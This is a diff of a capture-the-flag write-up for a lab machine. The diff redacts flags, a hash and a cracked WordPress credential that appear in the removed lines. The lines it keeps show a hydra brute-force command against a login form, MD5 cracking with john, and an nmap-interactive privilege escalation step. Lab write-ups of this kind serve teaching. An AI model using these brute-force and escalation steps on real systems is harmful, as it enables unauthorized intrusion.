@@ -26,7 +26,7 @@ We find a robots.txt file so we should investigate that:
     key-1-of-3.txt
     
     └─# cat key-1-of-3.txt 
-    073403c8a58a1f80d943455fb30724b9
+    {{redacted}}
 
 Lets also grab that .dic file
 
@@ -108,9 +108,9 @@ http-post-form = the type of attack to perform
 
 Here we find a user name 'elliot' we can run hydra again with pretty much the same parameters and arguments, except this time we will change the -L to -l to indicate a single username to try and change -p to -P and define the same sorted list we used before
 
-        hydra -l elliot -P sorted.dic 10.10.175.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:incorrect"
+        hydra -l {{redacted}} -P sorted.dic 10.10.175.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:incorrect"
 
-        [80][http-post-form] host: 10.10.175.151   login: elliot   password: ER28-0652
+        [80][http-post-form] host: 10.10.175.151   login: {{redacted}}   password: {{redacted}}
 
 Now that we have both a username and password let us login and figure out what we are dealing with
 
@@ -131,7 +131,7 @@ Once we navigate around a bit we find a user robot in the home directory with th
 
         daemon@linux:/home/robot$ cat password.raw-md5
         cat password.raw-md5
-        robot:c3fcd3d76192e4007dfb496cca67e13b
+        {{redacted}}
         
  Passing that hash into john we receive the following output:
 
@@ -141,14 +141,14 @@ Once we navigate around a bit we find a user robot in the home directory with th
         Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
         Warning: no OpenMP support for this hash type, consider --fork=4
         Press 'q' or Ctrl-C to abort, almost any other key for status
-        abcdefghijklmnopqrstuvwxyz (?)  
+        {{redacted}} 
 
 
 Lets change users and read that key file
 
         robot@linux:~$ cat key-2-of-3.txt
         cat key-2-of-3.txt
-        822c73956184f694993bede3eb39f959
+        {{redacted}}
 
 Now to see if we can escilate futher
 
@@ -201,5 +201,5 @@ nmap --interactive
         -rw-------  1 root root 1024 Sep 16  2015 .rnd
         # cat key-3-of-3.txt
         cat key-3-of-3.txt
-        04787ddef27c3dee1ee161b21670b4e4
+        {{redacted}}
 
